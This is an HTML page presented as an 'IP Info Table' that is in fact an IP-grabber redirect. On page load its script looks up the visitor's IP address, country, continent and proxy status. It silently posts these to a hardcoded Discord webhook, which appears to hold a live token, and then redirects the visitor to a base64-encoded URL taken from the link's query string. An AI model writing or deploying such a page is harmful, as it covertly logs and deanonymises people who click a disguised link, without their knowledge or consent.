<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Info Table</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f4f4f4;
        }
    </style>
</head>
<body>
    <h1>IP Information</h1>
    <table id="infoTable" style="display:none;">
        <thead>
            <tr>
                <th>IP Version</th>
                <th>IP Address</th>
                <th>Country Name</th>
                <th>Continent</th>
                <th>Is Proxy</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>

    <script>
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1322345788462071875/OrpRYnyIugZkioBPX5Nm1WaE8_LDh0dza2u8dNnWo5DY8ql0qG7ajjxf1MI3XCeA0aco'; // Replace with your Discord webhook URL

        // Helper function to extract query params
        function getQueryParams(url) {
            const params = new URL(url).searchParams;
            const queryParams = {};
            for (const [key, value] of params.entries()) {
                queryParams[key] = value;
            }
            return queryParams;
        }

        // Decrypt a URL (simulate UUID decryption for simplicity)
        function decryptUUID(encryptedUUID) {
            // Replace this logic with your real decryption logic
            const base64Decoded = atob(encryptedUUID); // Simulates a simple base64 decryption
            return base64Decoded;
        }

        async function fetchAndSendIPInfo() {
            const table = document.getElementById('infoTable');
            const tbody = table.querySelector('tbody');
            tbody.innerHTML = ''; // Clear any previous data

            try {
                const response = await fetch('https://freeipapi.com/api/json');

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                const data = await response.json();

                // Extract required fields
                const row = `<tr>
                    <td>${data.ipVersion || 'N/A'}</td>
                    <td>${data.ipAddress || 'N/A'}</td>
                    <td>${data.countryName || 'N/A'}</td>
                    <td>${data.continent || 'N/A'}</td>
                    <td>${data.isProxy ? 'Yes' : 'No'}</td>
                </tr>`;

                tbody.innerHTML = row;
                table.style.display = 'table';

                // Get query params and decrypt URL
                const queryParams = getQueryParams(window.location.href);
                const encryptedURL = Object.values(queryParams)[0]; // Assume the first param is the encrypted UUID
                const redirectURL = decryptUUID(encryptedURL);

                // Prepare the embed payload for Discord
                const embed = {
                    embeds: [
                        {
                            title: "IP Information",
                            fields: [
                                { name: "IP Version", value: data.ipVersion || 'N/A', inline: true },
                                { name: "IP Address", value: data.ipAddress || 'N/A', inline: true },
                                { name: "Country Name", value: data.countryName || 'N/A', inline: true },
                                { name: "Continent", value: data.continent || 'N/A', inline: true },
                                { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true },
                                { name: "Redirect URL", value: redirectURL, inline: false }
                            ],
                            color: 3447003 // Optional: Set a color for the embed
                        }
                    ]
                };

                // Send the data to the Discord webhook
                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embed)
                });

                // Redirect to the decrypted URL
                window.location.href = redirectURL;

            } catch (error) {
                alert('Failed to fetch or send data: ' + error.message);
            }
        }

        // Automatically fetch and send IP info when the page loads
        window.onload = fetchAndSendIPInfo;
    </script>
</body>
</html>
